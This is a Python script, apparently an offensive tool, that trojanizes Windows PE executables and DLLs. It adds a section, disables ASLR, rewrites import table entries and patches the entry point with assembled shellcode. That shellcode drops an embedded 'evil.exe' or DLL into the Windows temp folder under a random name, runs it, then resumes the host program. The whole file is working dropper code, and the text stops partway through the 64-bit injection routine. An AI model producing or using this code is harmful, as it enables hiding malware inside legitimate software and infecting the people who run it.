#!/usr/bin/python3
import pefile
import mmap
import os
from sys import argv
from keystone import *
from capstone import *
from capstone.x86 import *
import struct
import random
from string import ascii_lowercase


if len(argv) < 3:
    print("%s prog.exe evil.exe [args]" % argv[0])
    print("%s lib.dll evil.dll" % argv[0])
    exit()

def add_section(exe, name, size, perm):
    print(f"[+] add section \"{name}\", {perm}, {hex(size)} bytes")
    def align(val_to_align, alignment):
        return int((val_to_align + alignment - 1) / alignment) * alignment

    def get_characteristics(perm):
        characteristics = 0
        if perm.find("r") != -1:
            characteristics |= 0b01000000000000000000000000000000
        if perm.find("w") != -1:
            characteristics |= 0b10000000000000000000000000000000
        if perm.find("x") != -1:
            characteristics |= 0b00100000000000000000000000100000
        return characteristics

    original_size = os.path.getsize(exe)
    pe = pefile.PE(exe)

    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = number_of_section - 1
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)
    
    raw_size = align(size, file_alignment)
    virtual_size = align(size, section_alignment)
    raw_offset = align((pe.sections[last_section].PointerToRawData +
                        pe.sections[last_section].SizeOfRawData),
                       file_alignment)

    virtual_offset = align((pe.sections[last_section].VirtualAddress +
                            pe.sections[last_section].Misc_VirtualSize),
                           section_alignment)
    
    characteristics = get_characteristics(perm)
    name = name + (4 * '\x00')
    
    pe.set_bytes_at_offset(new_section_offset, name.encode())
    pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
    pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
    pe.set_dword_at_offset(new_section_offset + 16, raw_size)
    pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
    pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00').encode())
    pe.set_dword_at_offset(new_section_offset + 36, characteristics)

    pe.FILE_HEADER.NumberOfSections += 1
    pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
    pe.write(exe)
    overlay = pe.get_overlay()
    
    if overlay:
        fd = open(exe, 'a+b')
        map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
        map.resize(original_size - len(overlay))
        map.close()
        fd.close()

    fd = open(exe, 'a+b')
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(original_size + size*2)
    map.close()
    fd.close()

    if overlay:
        open(exe,"ab").write(overlay)

    pe = pefile.PE(exe)
    for section in pe.sections:
        if str(section.Name,"utf-8").startswith(name):
            offset = section.PointerToRawData
            pe.set_bytes_at_offset(offset, b"\x00"*section.SizeOfRawData)
    pe.write(exe)

    return pe.OPTIONAL_HEADER.ImageBase + virtual_offset

def init_section(exe_path, section_name, b):
    pe = pefile.PE(exe_path)
    for section in pe.sections:
        if section.Name.startswith(section_name.encode()):
            offset = section.PointerToRawData
            pe.set_bytes_at_offset(offset, (b*section.SizeOfRawData).encode())
    pe.write(exe_path)

def chg_section(exe, name, perm):
    pe = pefile.PE(exe)
    for section in pe.sections:
        if str(section.Name,"utf-8").startswith(name):
            print(f"[+] change section \"{name}\", {perm}")
            if perm.find("r") != -1:
                section.Characteristics |= 0b01000000000000000000000000000000
            if perm.find("w") != -1:
                section.Characteristics |= 0b10000000000000000000000000000000
            if perm.find("x") != -1:
                section.Characteristics |= 0b00100000000000000000000000100000
            pe.write(exe)

def disable_aslr(exe):
    pe = pefile.PE(exe)
    if int(pe.OPTIONAL_HEADER.DllCharacteristics) & 0x40:
        print("[+] disabling ASLR")
        pe.OPTIONAL_HEADER.DllCharacteristics = int(pe.OPTIONAL_HEADER.DllCharacteristics) ^ 0x40
        pe.write(exe)

addr = 0
def write_bytes(pe, _bytes):
    global addr
    pe.set_bytes_at_rva(addr, _bytes)
    addr += len(_bytes)

def write_instruction(pe, instruction):
    (opcode,_) = instruction
    write_bytes(pe, bytes(opcode))

def get_rw_section(pe):
    rw_section = False
    for section in pe.sections:
        if section.IMAGE_SCN_MEM_READ and section.IMAGE_SCN_MEM_WRITE and section.SizeOfRawData > 0:
            rw_section = section
            break
    return rw_section

def get_last_section(pe):
    for section in pe.sections:
        pass
    return section

def get_section_of_IAT(exe):
    pe = pefile.PE(exe)
    if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
        addr = pe.DIRECTORY_ENTRY_IMPORT[0].struct.FirstThunk
        for section in pe.sections:
            section_name = str(section.Name.strip(),"utf-8")
            start = section.VirtualAddress
            end = section.VirtualAddress + section.SizeOfRawData
            if start <= addr <= end:
                return section_name

def patch_IAT(exe):
    LoadLibraryA = []
    GetProcAddress = []
    pe = pefile.PE(exe)
    for lib in pe.DIRECTORY_ENTRY_IMPORT:
        if lib.dll.lower() == b'kernel32.dll':
            for func in lib.imports:
                if not LoadLibraryA:
                    if len(func.name) == len("LoadLibraryA"):
                        LoadLibraryA = [func.address, func.name]
                        pe.set_bytes_at_rva(func.struct_table.Function+2, b"LoadLibraryA")
                        print(f"[+] IAT {hex(func.address)}: {func.name} -> LoadLibraryA")
                    elif len(func.name) > len("LoadLibraryA"):
                        LoadLibraryA = [func.address, func.name]
                        pe.set_bytes_at_rva(func.struct_table.Function+2, b"LoadLibraryA\x00")
                        print(f"[+] IAT {hex(func.address)}: {func.name} -> LoadLibraryA")
                elif not GetProcAddress:
                    if len(func.name) == len("GetProcAddress"):
                        GetProcAddress = [func.address, func.name]
                        pe.set_bytes_at_rva(func.struct_table.Function+2, b"GetProcAddress")
                        print(f"[+] IAT {hex(func.address)}: {func.name} -> GetProcAddress")
                    elif len(func.name) > len("GetProcAddress"):
                        GetProcAddress = [func.address, func.name]
                        pe.set_bytes_at_rva(func.struct_table.Function+2, b"GetProcAddress\x00")
                        print(f"[+] IAT {hex(func.address)}: {func.name} -> GetProcAddress")
    if not LoadLibraryA or not GetProcAddress:
        print("[!] IAT not found appropriate function")
        exit()
    pe.write(exe)
    return [LoadLibraryA, GetProcAddress]

def is_exe(exe):
    return pefile.PE(exe).is_exe()

def is_dll(dll):
    return pefile.PE(exe).is_dll()

def random_name(size=5):
    #return "".join(list(map(lambda i: random.choice(ascii_lowercase), range(size)))).encode() + b".exe"
    return "".join(list(map(lambda i: random.choice(ascii_lowercase), range(size)))).encode() + b".dll"

def insert_code_32(exe1, exe2, exe2_args, iat):
    global addr
    pe = pefile.PE(exe1)
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    md = Cs(CS_ARCH_X86, CS_MODE_32)
    exe2_bytes = open(exe2, 'rb').read()

    unpack_path = b"c:\\windows\\temp\\" + random_name()
    command = unpack_path
    if exe2_args:
        command += b" " + exe2_args.encode()
    LoadLibraryA_PTR, overwritten_func1 = iat[0]
    GetProcAddress_PTR, overwritten_func2 = iat[1]

    inject_section = get_last_section(pe)
    print("[*] inject section: %s 0x%x" % (inject_section.Name.strip(), pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress))
    orig_bytes = pe.get_data(pe.OPTIONAL_HEADER.AddressOfEntryPoint,0x20)
    orig_instrs = []
    fill_instrs = []
    for instr in md.disasm(orig_bytes, pe.OPTIONAL_HEADER.AddressOfEntryPoint):
        if instr.address >= pe.OPTIONAL_HEADER.AddressOfEntryPoint + 5:
            for _ in range( instr.address - (pe.OPTIONAL_HEADER.AddressOfEntryPoint + 5) ):
                fill_instrs.append("nop")
            break
        orig_instrs.append( "%s %s" % (instr.mnemonic, instr.op_str) )

    addr = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    write_instruction(pe, ks.asm( "jmp 0x%x" % (inject_section.VirtualAddress-pe.OPTIONAL_HEADER.AddressOfEntryPoint) ) )
    for nop in fill_instrs:
        write_instruction(pe, ks.asm(nop))
    addr = inject_section.VirtualAddress
    write_instruction(pe, ks.asm("pushal") )
    write_instruction(pe, ks.asm("pushfd") )
    write_instruction(pe, ks.asm("call 5") )
    a = (addr-inject_section.VirtualAddress)
    write_instruction(pe, ks.asm("pop eax") )
    rw_section = get_rw_section(pe)
    print("[*] writable section: %s 0x%x" % (rw_section.Name.strip(), pe.OPTIONAL_HEADER.ImageBase+rw_section.VirtualAddress))
    rw_section_distance = inject_section.VirtualAddress - rw_section.VirtualAddress + a
    write_instruction(pe, ks.asm("sub eax, 0x%x" % rw_section_distance) )
    write_instruction(pe, ks.asm("push esp") )
    write_instruction(pe, ks.asm("pop edx") )
    write_instruction(pe, ks.asm("mov [eax], edx") )

    LoadLibraryA = 0x400
    GetProcAddress = 0x404
    CreateFileA = 0x408
    CreateFileMappingA = 0x40c
    MapViewOfFile = 0x410
    UnmapViewOfFile = 0x414
    CloseHandle = 0x418
    CreateProcessA = 0x41c
    hModule = 0x450
    hFile = 0x454
    hMapObject = 0x458
    lpMapAddress = 0x45c
    startupinfoa = 0x500
    process_information = 0x600
    file_content = 0x700

    write_instruction(pe, ks.asm(f"mov eax, [{LoadLibraryA_PTR}]"))
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}], eax"))
    write_instruction(pe, ks.asm(f"mov eax, [{GetProcAddress_PTR}]"))
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}], eax"))

    string = b"kernel32.dll\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpLibFileName
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}]"))
    write_instruction(pe, ks.asm("call eax")) # LoadLibraryA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}], eax")) # hModule

    string = overwritten_func1+b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{LoadLibraryA_PTR}], eax"))

    string = overwritten_func2+b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{GetProcAddress_PTR}], eax"))

    string = b"CreateFileA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileA}], eax"))

    string = b"CreateFileMappingA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileMappingA}], eax"))

    string = b"MapViewOfFile\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+MapViewOfFile}], eax"))

    string = b"CloseHandle\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}], eax"))

    string = b"UnmapViewOfFile\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+UnmapViewOfFile}], eax"))

    string = b"CreateProcessA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop edx"))
    write_instruction(pe, ks.asm("push edx")) # lpProcName
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}]")) # hModule
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call eax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateProcessA}], eax"))


    string = unpack_path + b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop esi"))
    write_instruction(pe, ks.asm("push 0")) # hTemplateFile = NULL
    write_instruction(pe, ks.asm("push 0x80")) # Attributes = FILE_ATTRIBUTE_NORMAL
    write_instruction(pe, ks.asm("push 2")) # Mode = CREATE_ALWAYS
    write_instruction(pe, ks.asm("push 0")) # pSecurity = NULL
    write_instruction(pe, ks.asm("push 1")) # SharedMode = FILE_SHARE_READ
    write_instruction(pe, ks.asm("push 0xc0000000")) # Access = GENERIC_READ|GENERIC_WRITE
    write_instruction(pe, ks.asm("push esi")) # FileName
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileA}]"))
    write_instruction(pe, ks.asm("call eax")) # CreateFileA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}], eax")) # hFile

    write_instruction(pe, ks.asm("push 0")) # MapName = NULL
    write_instruction(pe, ks.asm(f"push {len(exe2_bytes)}")) # MaximumSizeLow
    write_instruction(pe, ks.asm("push 0")) # MaximumSizeHigh = NULL
    write_instruction(pe, ks.asm("push 4")) # Protection = PAGE_READWRITE
    write_instruction(pe, ks.asm("push 0")) # pSecurity = NULL
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}]")) # hFile
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileMappingA}]"))
    write_instruction(pe, ks.asm("call eax")) # CreateFileMappingA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}], eax")) # hMapObject
    
    write_instruction(pe, ks.asm(f"push {len(exe2_bytes)}")) # MapSize
    write_instruction(pe, ks.asm("push 0")) # OffsetLow = NULL
    write_instruction(pe, ks.asm("push 0")) # OffsetHigh = NULL
    write_instruction(pe, ks.asm("push 0xf001f")) # AccessMode = FILE_MAP_ALL_ACCESS
    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}]")) # hMapObject
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+MapViewOfFile}]"))
    write_instruction(pe, ks.asm("call eax")) # MapViewOfFile()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+lpMapAddress}], eax")) # lpMapAddress
    write_instruction(pe, ks.asm("mov edi, eax"))

    write_instruction(pe, ks.asm(f"mov esi, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+file_content}"))
    write_instruction(pe, ks.asm(f"mov ecx, {len(exe2_bytes)}"))
    write_instruction(pe, ks.asm("rep movsb"))

    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+lpMapAddress}]")) # lpMapAddress
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+UnmapViewOfFile}]"))
    write_instruction(pe, ks.asm("call eax")) # UnmapViewOfFile()

    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hMapObject}]")) # hMapObject
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}]"))
    write_instruction(pe, ks.asm("call eax")) # CloseHandle()

    write_instruction(pe, ks.asm(f"push [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hFile}]")) # hFile
    write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CloseHandle}]"))
    write_instruction(pe, ks.asm("call eax")) # CloseHandle()

    if is_exe(exe2):
        string = command + b"\x00"
        write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
        write_bytes(pe, string)
        write_instruction(pe, ks.asm("pop esi"))
        write_instruction(pe, ks.asm(f"push {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+process_information}")) # lpProcessInformation
        write_instruction(pe, ks.asm(f"push {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+startupinfoa}")) # lpStartupInfo
        write_instruction(pe, ks.asm("push 0")) # lpCurrentDirectory
        write_instruction(pe, ks.asm("push 0")) # lpEnvironment
        write_instruction(pe, ks.asm("push 0")) # dwCreationFlags
        write_instruction(pe, ks.asm("push 0")) # bInheritHandles
        write_instruction(pe, ks.asm("push 0")) # lpThreadAttributes
        write_instruction(pe, ks.asm("push 0")) # lpProcessAttributes
        write_instruction(pe, ks.asm("push esi")) # lpCommandLine
        write_instruction(pe, ks.asm("push 0")) # lpApplicationName
        write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateProcessA}]"))
        write_instruction(pe, ks.asm("call eax")) # CreateProcessA()
    elif is_dll(exe2):
        string = unpack_path + b"\x00"
        write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
        write_bytes(pe, string)
        write_instruction(pe, ks.asm("pop esi"))
        write_instruction(pe, ks.asm("push esi")) # lpLibFileName
        write_instruction(pe, ks.asm(f"mov eax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}]"))
        write_instruction(pe, ks.asm("call eax")) # LoadLibraryA()
    
    write_instruction(pe, ks.asm("call +5") )
    a = (addr-inject_section.VirtualAddress)
    write_instruction(pe, ks.asm("pop eax") )
    rw_section_distance = inject_section.VirtualAddress - rw_section.VirtualAddress + a
    write_instruction(pe, ks.asm("sub eax, 0x%x" % rw_section_distance) )
    write_instruction(pe, ks.asm("mov esp, [eax]") )
    write_instruction(pe, ks.asm( "mov dword ptr[eax], 0x%x" % struct.unpack('<I',pe.get_data(rw_section.VirtualAddress,4))[0] ) )
    write_instruction(pe, ks.asm("popfd") )
    write_instruction(pe, ks.asm("popal") )

    a = addr
    for instr in orig_instrs:
        write_instruction(pe, ks.asm(instr, addr) )

    write_instruction(pe, ks.asm( "jmp -0x%x" % (addr-pe.OPTIONAL_HEADER.AddressOfEntryPoint-(addr-a)) ) )

    addr = inject_section.VirtualAddress+file_content
    write_bytes(pe, exe2_bytes)

    pe.OPTIONAL_HEADER.CheckSum = pe.generate_checksum()
    pe.write(exe1)

def insert_code_64(exe1, exe2, exe2_args, iat):
    global addr
    pe = pefile.PE(exe1)
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    md = Cs(CS_ARCH_X86, CS_MODE_64)
    exe2_bytes = open(exe2, 'rb').read()

    LoadLibraryA_PTR, overwritten_func1 = iat[0]
    GetProcAddress_PTR, overwritten_func2 = iat[1]

    
    unpack_path = b"c:\\windows\\temp\\" + random_name()
    command = unpack_path
    if exe2_args:
        command += b" " + exe2_args.encode()
    LoadLibraryA_PTR, overwritten_func1 = iat[0]
    GetProcAddress_PTR, overwritten_func2 = iat[1]

    inject_section = get_last_section(pe)
    print("[*] inject section: %s 0x%x" % (inject_section.Name.strip(), pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress))
    orig_bytes = pe.get_data(pe.OPTIONAL_HEADER.AddressOfEntryPoint,0x20)
    orig_instrs = []
    fill_instrs = []
    for instr in md.disasm(orig_bytes, pe.OPTIONAL_HEADER.AddressOfEntryPoint):
        if instr.address >= pe.OPTIONAL_HEADER.AddressOfEntryPoint + 5:
            for _ in range( instr.address - (pe.OPTIONAL_HEADER.AddressOfEntryPoint + 5) ):
                fill_instrs.append("nop")
            break
        orig_instrs.append( "%s %s" % (instr.mnemonic, instr.op_str) )

    addr = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    write_instruction(pe, ks.asm( "jmp 0x%x" % (inject_section.VirtualAddress-pe.OPTIONAL_HEADER.AddressOfEntryPoint) ) )
    for nop in fill_instrs:
        write_instruction(pe, ks.asm(nop))
    addr = inject_section.VirtualAddress
    write_instruction(pe, ks.asm("push rax"))
    write_instruction(pe, ks.asm("push rcx"))
    write_instruction(pe, ks.asm("push rdx"))
    write_instruction(pe, ks.asm("push rbx"))
    write_instruction(pe, ks.asm("push rsp"))
    write_instruction(pe, ks.asm("push rbp"))
    write_instruction(pe, ks.asm("push rsi"))
    write_instruction(pe, ks.asm("push rdi"))
    write_instruction(pe, ks.asm("push r8"))
    write_instruction(pe, ks.asm("push r9"))
    write_instruction(pe, ks.asm("push r10"))
    write_instruction(pe, ks.asm("push r11"))
    write_instruction(pe, ks.asm("push r12"))
    write_instruction(pe, ks.asm("push r13"))
    write_instruction(pe, ks.asm("push r14"))
    write_instruction(pe, ks.asm("push r15"))
    write_instruction(pe, ks.asm("pushfq"))
    write_instruction(pe, ks.asm("call 5") )
    a = (addr-inject_section.VirtualAddress)
    write_instruction(pe, ks.asm("pop rax") )
    rw_section = get_rw_section(pe)
    print("[*] writable section: %s 0x%x" % (rw_section.Name.strip(), pe.OPTIONAL_HEADER.ImageBase+rw_section.VirtualAddress))
    rw_section_distance = inject_section.VirtualAddress - rw_section.VirtualAddress + a
    write_instruction(pe, ks.asm("sub rax, 0x%x" % rw_section_distance) )
    write_instruction(pe, ks.asm("push rsp") )
    write_instruction(pe, ks.asm("pop rdx") )
    write_instruction(pe, ks.asm("mov [rax], rdx") )

    LoadLibraryA = 0x500
    GetProcAddress = 0x508
    CreateFileA = 0x510
    CreateFileMappingA = 0x518
    MapViewOfFile = 0x520
    UnmapViewOfFile = 0x528
    CloseHandle = 0x530
    CreateProcessA = 0x538
    hModule = 0x550
    hFile = 0x558
    hMapObject = 0x560
    lpMapAddress = 0x568
    startupinfoa = 0x600
    process_information = 0x700
    file_content = 0x800

    write_instruction(pe, ks.asm(f"mov rax, [{LoadLibraryA_PTR}]"))
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}], rax"))
    write_instruction(pe, ks.asm(f"mov rax, [{GetProcAddress_PTR}]"))
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}], rax"))

    string = b"kernel32.dll\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rcx")) # lpLibFileName
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+LoadLibraryA}]"))
    write_instruction(pe, ks.asm("call rax")) # LoadLibraryA()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}], rax")) # hModule

    string = overwritten_func1+b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{LoadLibraryA_PTR}], rax"))

    string = overwritten_func2+b"\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{GetProcAddress_PTR}], rax"))

    string = b"CreateFileA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileA}], rax"))

    string = b"CreateFileMappingA\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
    write_instruction(pe, ks.asm(f"mov [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+CreateFileMappingA}], rax"))

    string = b"MapViewOfFile\x00"
    write_instruction(pe, ks.asm(f"call +{5+len(string)}"))
    write_bytes(pe, string)
    write_instruction(pe, ks.asm("pop rdx")) # lpProcName
    write_instruction(pe, ks.asm(f"mov rcx, {pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+hModule}")) # hModule
    write_instruction(pe, ks.asm("mov rcx, [rcx]"))
    write_instruction(pe, ks.asm(f"mov rax, [{pe.OPTIONAL_HEADER.ImageBase+inject_section.VirtualAddress+GetProcAddress}]"))
    write_instruction(pe, ks.asm("call rax")) # GetProcAddress()
